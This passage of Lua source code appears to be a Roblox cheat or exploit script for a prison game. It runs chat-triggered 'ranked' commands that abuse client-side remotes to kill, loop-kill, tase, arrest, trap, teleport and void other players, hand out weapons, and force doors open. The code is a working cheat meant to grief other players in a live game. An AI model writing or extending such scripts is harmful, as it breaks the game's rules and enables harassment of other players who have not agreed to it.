            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        game:GetService("Workspace").Remote.ItemHandler:InvokeServer(game:GetService("Workspace").Prison_ITEMS.single.Hammer.ITEMPICKUP)
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character.Hammer.GripUp = Vector3.new(1, -0.1, 110)
        game.Players.LocalPlayer.Character.Hammer.GripPos = Vector3.new(0.9, -1, 1.5)
        wait()
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        wait()
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        pcall(function()
            WhitelistItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
        end)
    end
end


function RandomPlayer()
    local PlayersTable = Players:GetPlayers();
    local RandomIndex = math.random(1, #PlayersTable);
    return PlayersTable[RandomIndex];
end;

function RandomTeam()
    local Teams = {"guards", "inmates", "criminals"};
    return Teams[math.random(1, #Teams)];
end;

--// Ranked Commands:
function UseRankedCommands(MESSAGE, Admin)
    if Admin == LocalPlayer then
        return
    end;
    local Args = MESSAGE:split(" ");

    if not Args[1] then 
        return
    end;

    if Args[1] == "/e" then
        table.remove(Args, 1);
    end;

    if Args[1] == "/w" then
        table.remove(Args, 1)
        if Args[2] then
            table.remove(Args, 1);
        end; 
    end;

    if Args[1]:sub(1, 1) ~= Settings.Prefix then
        return
    end;

    local CommandName = Args[1]:sub(2);
    local PF = Settings.Prefix;
    
    local function CMD2(NAME)
        return NAME == CommandName:lower();
    end;

    local function WarnProtected(Admin, Player, CMD)
        Chat("/w " .. Admin.Name .. " " .. Player.Name .. " is protected from that command!");
        Chat("/w " .. Player.Name .. " " .. Admin.Name .. " tried to use " .. Settings.Prefix .. CMD .. " on you but you are on the protected list.");
    end;

    local function WarnDisabled(CMD)
        Chat("/w " .. Admin.Name .. " " .. Settings.Prefix .. CMD .. " is disabled right now.");
    end;

    local function NotAValidPlayer(CMD)
        Chat("/w " .. Admin.Name .. " " .. Args[2] .. " is not a valid player. Example - " .. PF .. CMD .. " " .. RandomPlayer().Name:lower() .. " or " .. PF .. CMD .. " me");
    end;

    if CMD2("cmds") or CMD2("cmd") then
        Chat("/w " .. Admin.Name .. " [Help]:  type " .. PF .. "help to view description of the command and what it does.");
        Chat("/w " .. Admin.Name .. " " .. PF .. "kill [plr,inmates,guards,criminals,all] " .. PF .. "lk/loopkill [plr] " .. PF .. "unlk/unloopkill [plr] " .. PF .. "arrest [plr] " .. PF .. "crim [plr] " .. PF .. "fling [plr] " .. PF .. "sfling [plr] ");
        Chat("/w " .. Admin.Name .. " " .. PF .. "key [plr] " .. PF .. "tase [plr,all] " .. PF .. "nuke [plr] "  .. PF .. "bring [plr] " .. PF .. "oneshot [plr] "  .. PF .. "goto [plr] " .. PF .. "onepunch [plr] " .. PF .. "doorsopen/opensesame ");
        Chat("/w " .. Admin.Name .. " " .. PF .. "nexus/back [plr] " .. PF .. "cafe [plr] " .. PF .. "tower [plr] " .. PF .. "yard [plr] " .. PF .. "cells [plr] " .. PF .. "roof [plr] " .. PF .. "crimbase/base [plr] " .. PF .. "trap [plr] " .. PF .. "untrap [plr] ");
        Chat("/w " .. Admin.Name .. " " .. PF .. "virus [plr] " .. PF .. "unvirus [plr] " .. PF .. "ka/killaura [plr] " .. PF .. "unka/unkillaura [plr] " .. PF .. "void [plr] " .. PF .. "armory [plr] " .. PF .. "cars/carspawn " .. PF .. "opendoors ");
    end;
    if CMD2("help") then
        Chat("/w " .. Admin.Name .. " nexus, cafe, tower, yard, cells, back, armory, crimbase, roof -- Teleports to that place. virus/unvirus -- killtouch, anyone you touch dies. killaura/unkillaura -- killtouch but more farther range.");
        Chat("/w " .. Admin.Name .. " oneshot -- if you shoot a person once, they DIE. onepunch -- if you punch a person once, they DIE (only works on pc). void -- Brings player to the ABYSS or void.");
        Chat("/w " .. Admin.Name .. " trap -- traps players inside a building that has no way out. tase -- tase players. key -- gives you keycard (You must pick it up manually). nuke -- if you die, Everyone dies.");
        Chat("/w " .. Admin.Name .. " bring -- bring players to you. goto -- brings you to that person. loopkill -- loops killing player. kill -- kills player. opendoors -- opens every doors. fling -- flings player.");
        Chat("/w " .. Admin.Name .. " cars -- spawns a car to your location (might not work because networkowner is weird). arrest -- arrests player. crim -- makes player criminal.");
    end; 
    if CMD2("kill") then
        if AdminSettings.killcmds == true then
            if Args[2] == "all" then
                KillPlayers(Players, Admin);
                Chat("/w " .. Admin.Name .. " Success! Killed all.");
                AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used kill all.");
            elseif Args[2] == "inmates" then
                KillPlayers(Teams.Inmates, Admin);
                Chat("/w " .. Admin.Name .. " Success! Killed inmates.");
                AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used kill inmates");
            elseif Args[2] == "guards" then
                KillPlayers(Teams.Guards, Admin);
                Chat("/w " .. Admin.Name .. " Success! Killed guards.");
                AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used kill guards.");
            elseif Args[2] == "criminals" then
                KillPlayers(Teams.Criminals, Admin);
                Chat("/w " .. Admin.Name .. " Success! Killed criminals.");
                AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used kill criminals.");
            else
                local Player = GetPlayer(Args[2], Admin);
                if Player then
                    if CheckProtected(Player, "killcmds") or Player == Admin then
                        AddToQueue(function()
                            Kill({Player});
                        end);
                    else
                        WarnProtected(Admin, Player, "kill");
                    end;
                    AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used kill command on " .. Player.Name .. ". ")
                else
                    Chat("/w " .. Admin.Name .. " " .. Args[2] .. " is not a valid player. Example - " .. PF .. "kill " .. RandomPlayer().Name:lower() .. " or " .. PF .. "kill " .. RandomTeam() .. " or " .. PF .. "kill all");
                end;
            end;
        else
            WarnDisabled("kill");
        end;
    end;
    if CMD2("nuke") then
        local Player = GetPlayer(Args[2], Admin);
        AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used nuke command on " .. Player.Name .. ". ")
        if Player then
            Nukes[Player.UserId] = Player;
            Chat("!!! " .. Player.DisplayName .. " has turned into a nuke - if they die everyone dies !!!");
            Notify("Success", "Turned " .. Player.Name .. " into a nuke.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
            Chat("/w " .. Admin.Name .. " Not a valid player.");
        end;
    end;
    if CMD2("tase") or CMD2("taze") then
        SavedOldTeam = game.Players.LocalPlayer.TeamColor
        if AdminSettings.killcmds == true then
            if Args[2] == "all" then
                Tase(Players:GetPlayers());
                Chat("/w " .. Admin.Name .. " Success! tased all");
                AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used tase all.");
            task.wait(0.5)
	if SavedOldTeam ~= BrickColor.new("Bright blue") then
                if SavedOldTeam ~= BrickColor.new("Really red") then
                    SaveCameraPos()
                    diedpos = char:WaitForChild("HumanoidRootPart").CFrame
		    workspace.Remote.TeamEvent:FireServer(SavedOldTeam.Name)
                    LoadCameraPos()
                else 
                      diedpos = char:WaitForChild("HumanoidRootPart").CFrame
                                 repeat
                                 SaveCameraPos()
                                 task.wait()
	                         crimspawnpoint = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                                 workspace["Criminals Spawn"].SpawnLocation.CFrame = crimspawnpoint
                                 until player.TeamColor == BrickColor.new("Really red")
                                 LoadCameraPos()
                                 local object = workspace['Criminals Spawn'].SpawnLocation
                                 local newPosition = CFrame.new(Vector3.new(10, 100, 10))
                                 object.CFrame = newPosition
                end
	end
            else
                local Player = GetPlayer(Args[2], Admin);
                if Player then
                    if CheckProtected(Player, "killcmds") or Player == Admin then
                        AddToQueue(function()
                            Tase({Player});
                            Chat("/w " .. Admin.Name .. " Success! tased " .. Player.Name .. ". ");
                            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used tase command on " .. Player.Name .. ". ");
            task.wait(0.5)
	if SavedOldTeam ~= BrickColor.new("Bright blue") then
                if SavedOldTeam ~= BrickColor.new("Really red") then
                    SaveCameraPos()
                    diedpos = char:WaitForChild("HumanoidRootPart").CFrame
		    workspace.Remote.TeamEvent:FireServer(SavedOldTeam.Name)
                    LoadCameraPos()
                else
                      diedpos = char:WaitForChild("HumanoidRootPart").CFrame
                                 repeat
                                 SaveCameraPos()
                                 task.wait()
	                         crimspawnpoint = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                                 workspace["Criminals Spawn"].SpawnLocation.CFrame = crimspawnpoint
                                 until player.TeamColor == BrickColor.new("Really red")
                                 LoadCameraPos()
                                 local object = workspace['Criminals Spawn'].SpawnLocation
                                 local newPosition = CFrame.new(Vector3.new(10, 100, 10))
                                 object.CFrame = newPosition
                end
	end
                        end);
                    else
                        WarnProtected(Admin, Player, "tase");
                    end;
                else
                    Chat("/w " .. Admin.Name .. " " .. Args[2] .. " is not a valid player. Example - " .. PF .. "tase " .. RandomPlayer().Name:lower() .. " or " .. PF .. "tase all");
                end;
            end;
        else
            WarnDisabled("tase");
        end;
    end;
    if CMD2("opendoors") or CMD2("opensesame") or CMD2("doorsopen") or CMD2("opensaysme") or CMD2("open") then
	local player = game.Players.LocalPlayer
	local OldTeam = player.TeamColor
	if player.TeamColor ~= BrickColor.new("Bright blue") then
                diedpos = char:WaitForChild("HumanoidRootPart").CFrame
                SaveCameraPos()
		workspace.Remote.TeamEvent:FireServer("Bright blue")
                LoadCameraPos()
	end
	wait(0.6)
        if player.TeamColor == BrickColor.new("Bright orange") or player.TeamColor == BrickColor.new("Really red") and #game:GetService("Teams").Guards:GetPlayers() >= 8 then
            Chat("/w " .. Admin.Name .. " Error! Failed to open doors, guards team full!");
        else
	local players = game:GetService("Players")

	local me = players.LocalPlayer
	local oldcollision = {}

	for i,v in pairs(workspace.Doors:GetChildren()) do
		if v:IsA("Model") then
			local pivot = v:GetPivot()
			v:PivotTo(me.Character:GetPivot())
			for _,vv in pairs(v:GetDescendants()) do
				if vv:IsA("BasePart") and vv.CanCollide then
					oldcollision[vv] = true
					vv.CanCollide = false
				end
			end
			task.delay(0, function()
				v:PivotTo(pivot)
				for _,vv in pairs(v:GetDescendants()) do
					if vv:IsA("BasePart") and oldcollision[vv] then
						vv.CanCollide = true
					end
				end
			end)
		end
	end
        local clientplayer = game.Players.LocalPlayer
	if OldTeam ~= BrickColor.new("Bright blue") then
                if OldTeam ~= BrickColor.new("Really red") then
                wait(1.4)
                diedpos = char:WaitForChild("HumanoidRootPart").CFrame
                SaveCameraPos()
		workspace.Remote.TeamEvent:FireServer(OldTeam.Name)
                LoadCameraPos()
                elseif OldTeam == BrickColor.new("Really red") then
                                 wait(1.4)
                                 local crimspawnpoint
                                 diedpos = char:WaitForChild("HumanoidRootPart").CFrame
                                 SaveCameraPos()
                                 if #game:GetService("Teams").Guards:GetPlayers() < 8 then
		                     workspace.Remote.TeamEvent:FireServer("Bright blue")
	                         else
		                     workspace.Remote.TeamEvent:FireServer("Bright orange")
	                         end
                                 LoadCameraPos()
                                 repeat
                                 task.wait()
	                         crimspawnpoint = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                                 workspace["Criminals Spawn"].SpawnLocation.CFrame = crimspawnpoint
                                 until player.TeamColor == BrickColor.new("Really red")
                                 local object = workspace['Criminals Spawn'].SpawnLocation
                                 local newPosition = CFrame.new(Vector3.new(10, 100, 10))
                                 object.CFrame = newPosition
                end
	end
            Chat("/w " .. Admin.Name .. " Success! Opened doors!");
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used opendoors.");
        end
    end;       
    if CMD2("lk") or CMD2("loopkill") then
        if AdminSettings.killcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "killcmds") or Player == Admin then
                    AddToQueue(function()
                        Loopkilling[Player.UserId] = Player;
                    end);
                else
                    WarnProtected(Admin, Player, "lk");
                end;
                Chat("/w " .. Admin.Name .. " Success! Loopkilling " .. Player.Name .. ". ")
                AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used loopkill command on " .. Player.Name .. ". ");
            else
                NotAValidPlayer("lk");
            end;
        else
            WarnDisabled("lk")
        end;
    end;
    if CMD2("unlk") or CMD2("unloopkill") then
        local Player = GetPlayer(Args[2], Admin);
        if Player then
            AddToQueue(function()
                Loopkilling[Player.UserId] = nil;
            end);
        else
            NotAValidPlayer("unlk");
        end;
        Chat("/w " .. Admin.Name .. " Success! Unloopkilled " .. Player.Name .. ". ");
        AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used unloopkill command on " .. Player.Name .. ". ");
    end;
    if CMD2("cars") or CMD2("car") or CMD2("carspawn") or CMD2("scar") or CMD2("spawncars") then
       local Player = GetPlayer(Args[2], Admin);
       pcall(function()
       spawncarsto(Player)
       end)
       Chat("/w " .. Admin.Name .. " Success! Brought a car to your location");
       AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used carspawn command");
    end;
    if CMD2("arrest") then
        if AdminSettings.arrestcmds == true then
            SavePos();
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "arrestcmds") or Player == Admin then
                        Arrest(Player, 1);
                else
                    WarnProtected(Admin, Player, "arrest");
                end;
                AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used arrest command on " .. Player.Name .. ". ");
            else
                NotAValidPlayer("arrest");
            end;
            task.wait(0.15);
            for i = 1, 10 do
                LoadPos();
            end;
        else
            WarnDisabled("arrest");
        end;
    end;
    if CMD2("crim") or CMD2("criminal") then
        ---it WAS a placeholder but now its not. Chat("/w " .. Admin.Name .. " This is a placeholder command, which means it will not work!");
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        Crim(Player, false);
                    end);
                else
                    WarnProtected(Admin, Player, "crim");
                end;
            else
                NotAValidPlayer("crim");
            end;
        else
            WarnDisabled("crim");
        end;
    end;
    if CMD2("fling") then
        Chat("/w " .. Admin.Name .. " This is a placeholder command, which means it will not work!");
        if AdminSettings.othercmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "othercmds") or Player == Admin then
                    AddToQueue(function()
                        Fling(Player, false);
                    end);
                else
                    WarnProtected(Admin, Player, "fling");
                end;
            else
                NotAValidPlayer("fling");
            end;
        else
            WarnDisabled("fling");
        end;
    end;
    if CMD2("sfling") then
        Chat("/w " .. Admin.Name .. " This is a placeholder command, which means it will not work!");
        if AdminSettings.othercmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "othercmds") or Player == Admin then
                    AddToQueue(function()
                        Fling(Player, true);
                    end);
                else
                    WarnProtected(Admin, Player, "sfling");
                end;
            else
                NotAValidPlayer("sfling");
            end;
        else
            WarnDisabled("sfling");
        end;
    end;
    if CMD2("keycard") or CMD2("key") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
              if #game:GetService("Teams").Guards:GetPlayers() < 8 then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        print("Debug_Key pending")
                        Keycard(Player);
                        print("Debug_Key done")
                        AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used keycard command on " .. Player.Name .. ". ");
                    end);
                    Chat("/w " .. Admin.Name .. " You need to pick it up yourself!")
                else
                    WarnProtected(Admin, Player, "keycard");
                end;
              else
                  Chat("/w " .. Admin.Name .. " Error! Guards team full.")
              end
            else
                NotAValidPlayer("keycard");
            end;
        else
            WarnDisabled("keycard");
        end;
    end;
    if CMD2("handcuffs") or CMD2("cuffs") then
        Chat("/w " .. Admin.Name .. " Error! This command is patched.");
        --Humanoid glitch patched
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "Handcuffs", false, "Bright blue", true);
                    end);
                else
                    WarnProtected(Admin, Player, "handcuffs");
                end;
            else
                NotAValidPlayer("handcuffs");
            end;
        else
            WarnDisabled("handcuffs");
        end;
    end;
    if CMD2("taser") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "Taser", false, "Bright blue", true);
                    end);
                else
                    WarnProtected(Admin, Player, "taser");
                end;
            else
                NotAValidPlayer("taser");
            end;
        else
            WarnDisabled("taser");
        end;
    end;
    if CMD2("shield") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    if CheckOwnedGamepass() then
                        AddToQueue(function()
                            Give(Player, "Riot Shield", true, "Bright blue");
                        end);
                    else
                        Chat("/w " .. Admin.Name .. " I cannot use this command because I don't have the riot gamepass.");
                    end;
                else
                    WarnProtected(Admin, Player, "shield");
                end;
            else
                NotAValidPlayer("shield");
            end;
        else
            WarnDisabled("shield");
        end;
    end;
    if CMD2("shotty") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "Remington 870", true);
                    end);
                else
                    WarnProtected(Admin, Player, "shotty");
                end;
            else
                NotAValidPlayer("shotty");
            end;
        else
            WarnDisabled("shotty");
        end;
    end;
    if CMD2("m9") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "M9", true);
                    end);
                else
                    WarnProtected(Admin, Player, "m9");
                end;
            else
                NotAValidPlayer("m9");
            end;
        else
            WarnDisabled("m9");
        end;
    end;
    if CMD2("ak") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "AK-47", true);
                    end);
                else
                    WarnProtected(Admin, Player, "ak");
                end;
            else
                NotAValidPlayer("ak");
            end;
        else
            WarnDisabled("ak");
        end;
    end;
    if CMD2("m4") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    if CheckOwnedGamepass() then
                        AddToQueue(function()
                            Give(Player, "M4A1", true);
                        end);
                    else
                        Chat("/w " .. Admin.Name .. " I cannot use this command because I don't have the riot gamepass.");
                    end;
                else
                    WarnProtected(Admin, Player, "m4");
                end;
            else
                NotAValidPlayer("m4");
            end;
        else
            WarnDisabled("m4");
        end;
    end;
    if CMD2("hammer") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "Hammer", false);
                    end);
                else
                    WarnProtected(Admin, Player, "hammer");
                end;
            else
                NotAValidPlayer("hammer");
            end;
        else
            WarnDisabled("hammer");
        end;
    end;
    if CMD2("knife") then
        if AdminSettings.givecmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "givecmds") or Player == Admin then
                    AddToQueue(function()
                        Give(Player, "Crude Knife", false);
                    end);
                else
                    WarnProtected(Admin, Player, "knife");
                end;
            else
                NotAValidPlayer("knife");
            end;
        else
            WarnDisabled("knife");
        end;
    end;
    if CMD2("nexus") or CMD2("nex") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                        mysaved.telecmdoldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame 
                        Teleport(Player, CFrame.new(888, 100, 2388));
                        wait(1)
                        Jump()
                        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.telecmdoldpos
                        end)
                        print("Debug")
                    end);
                else
                    WarnProtected(Admin, Player, "nexus");
                end;
            else
                NotAValidPlayer("nexus");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used nexus command on " .. Player.Name .. ". ");
        else
            WarnDisabled("nexus")
        end;
    end;
    if CMD2("roof") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                        mysaved.telecmdoldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame 
                        Teleport(Player, CFrame.new(932.247314453125, 136.9999542236328, 2235.9921875));
                        wait(1)
                        Jump()
                        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.telecmdoldpos
                        end)
                        print("Debug")
                    end);
                else
                    WarnProtected(Admin, Player, "roof");
                end;
            else
                Chat("/w " .. Admin.Name .. " Not a valid player.");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used roof command on " .. Player.Name .. ". ");
        end;
    end;
    if CMD2("tower") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                        mysaved.telecmdoldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                        Teleport(Player, CFrame.new(823, 130, 2588));
                        wait(1)
                        Jump()
                        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.telecmdoldpos
                        end)
                    end);
                else
                    WarnProtected(Admin, Player, "tower");
                end;
            else
                NotAValidPlayer("tower");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used tower command on " .. Player.Name .. ". ");
        else
            WarnDisabled("tower");
        end;
    end;
    if CMD2("back") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                        mysaved.telecmdoldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                        Teleport(Player, CFrame.new(984, 100, 2318));
                        wait(1)
                        Jump()
                        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.telecmdoldpos
                        end)
                    end);
                else
                    WarnProtected(Admin, Player, "back");
                end;
            else
                NotAValidPlayer("back");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used back command on " .. Player.Name .. ". ");
        else
            WarnDisabled("back");
        end;
    end;
    if CMD2("base") or CMD2("crimbase") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                        mysaved.telecmdoldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                        Teleport(Player, CFrame.new(-943, 94, 2056));
                        wait(1)
                        Jump()
                        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.telecmdoldpos
                        end)
                    end);
                else
                    WarnProtected(Admin, Player, "base");
                end;
            else
                NotAValidPlayer("base");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used criminal base command on " .. Player.Name .. ". ");
        else
            WarnDisabled("base");
        end;
    end;
    if CMD2("armory") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                        mysaved.telecmdoldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                        Teleport(Player, CFrame.new(837, 100, 2266));
                        wait(1)
                        Jump()
                        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.telecmdoldpos
                        end)
                    end);
                else
                    WarnProtected(Admin, Player, "armory");
                end;
            else
                NotAValidPlayer("armory");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used armory command on " .. Player.Name .. ". ");
        else
            WarnDisabled("armory");
        end;
    end;
    if CMD2("yard") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                        mysaved.telecmdoldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                        Teleport(Player, CFrame.new(791, 98, 2498));
                        wait(1)
                        Jump()
                        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.telecmdoldpos
                        end)
                    end);
                else
                    WarnProtected(Admin, Player, "yard");
                end;
            else
                NotAValidPlayer("yard");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used yard command on " .. Player.Name .. ". ");
        else
            WarnDisabled("yard");
        end;
    end;
    if CMD2("cells") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                        mysaved.telecmdoldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                        Teleport(Player, CFrame.new(917, 100, 2444));
                        wait(1)
                        Jump()
                        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.telecmdoldpos
                        end)
                    end);
                else
                    WarnProtected(Admin, Player, "cells");
                end;
            else
                NotAValidPlayer("cells");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used cells command on " .. Player.Name .. ". ");
        else
            WarnDisabled("cells")
        end;
    end;
    if CMD2("cafe") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                        mysaved.telecmdoldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                        Teleport(Player, CFrame.new(930, 100, 2289));
                        wait(1)
                        Jump()
                        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.telecmdoldpos
                        end)
                    end);
                else
                    WarnProtected(Admin, Player, "cafe");
                end;
            else
                NotAValidPlayer("cafe");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used cafe command on " .. Player.Name .. ". ");
        else
            WarnDisabled("cafe");
        end;
    end;
    if CMD2("ka") or CMD2("killaura") then
        if AdminSettings.killcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "killcmds") or Player == Admin then
                    AddToQueue(function()
                        KillAuras[Player.UserId] = Player;
                    end);
                else
                    WarnProtected(Admin, Player, "ka");
                end;
            else
                NotAValidPlayer("ka");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used killaura command on " .. Player.Name .. ". ");
        else
            WarnDisabled("ka");
        end;
    end;
    if CMD2("unka") or CMD2("unkillaura") then
        local Player = GetPlayer(Args[2], Admin);
        if Player then
            AddToQueue(function()
                KillAuras[Player.UserId] = nil;
            end);
        else
            NotAValidPlayer("unka");
        end;
        AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used unkillaura command on " .. Player.Name .. ". ");
    end;
    if CMD2("virus") then
        if AdminSettings.killcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "killcmds") or Player == Admin then
                    AddToQueue(function()
                        Infected[Player.UserId] = Player;
                    end);
                else
                    WarnProtected(Admin, Player, "virus");
                end;
            else
                NotAValidPlayer("virus");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used virus command on " .. Player.Name .. ". ");
        else
            WarnDisabled("virus");
        end;
    end;
    if CMD2("unvirus") then
        local Player = GetPlayer(Args[2], Admin);
        if Player then
            AddToQueue(function()
                Infected[Player.UserId] = nil;
            end);
        else
            NotAValidPlayer("virus");
        end;
        AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used unvirus command on " .. Player.Name .. ". ");
    end;
    if CMD2("trap") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        Trapped[Player.UserId] = Player;
                    end);
                else
                    WarnProtected(Admin, Player, "trap");
                end;
            else
                NotAValidPlayer("trap");
            end;
            AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used trap command on " .. Player.Name .. ". ");
        else
            WarnDisabled("trap");
        end;
    end;
    if CMD2("untrap") then
        local Player = GetPlayer(Args[2], Admin);
        if Player then
            if CheckProtected(Player, "tpcmds") or Player == Admin then
                AddToQueue(function()
                    Trapped[Player.UserId] = nil;
                end);
            else
                WarnProtected(Admin, Player, "untrap");
            end;
        else
            NotAValidPlayer("untrap");
        end;
        AddLog("Success", "Ranked Player: " .. Admin.Name .. " Used untrap command on " .. Player.Name .. ". ");
    end;
    if CMD2("void") then
        if AdminSettings.tpcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "tpcmds") or Player == Admin then
                    AddToQueue(function()
                        pcall(function()
                        mysaved.telecmdoldpos = LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                        Teleport(Player, CFrame.new(0, 9e9, 0));
                        diedpos = mysaved.telecmdoldpos
                        wait(1)
                        Jump()
                        Refresh()
                        chwait()
                        diedpos = mysaved.telecmdoldpos
                        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = mysaved.telecmdoldpos
                        end)
                    end);
                else
